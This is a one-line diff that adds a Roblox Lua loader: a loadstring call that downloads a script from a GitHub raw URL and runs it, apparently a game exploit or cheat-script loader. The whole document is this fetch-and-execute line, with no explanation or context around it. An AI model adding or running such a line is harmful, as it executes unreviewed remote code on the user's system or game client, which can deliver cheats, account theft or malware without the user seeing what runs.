@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/GearV4isBack/25Bullets/refs/heads/main/moonveil.lua.txt"))();
